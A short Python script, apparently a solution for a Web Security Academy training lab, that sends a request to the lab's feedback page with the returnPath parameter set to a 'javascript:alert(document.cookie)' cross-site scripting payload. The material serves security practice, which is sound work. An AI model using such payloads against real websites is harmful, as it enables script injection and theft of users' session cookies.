import requests

url = "https://0ada00ab0346675f81c1431900ed0094.web-security-academy.net/feedback"

payload = {
    "returnPath" : "javascript:alert(document.cookie)"
}

response = requests.get(url=url, params=payload)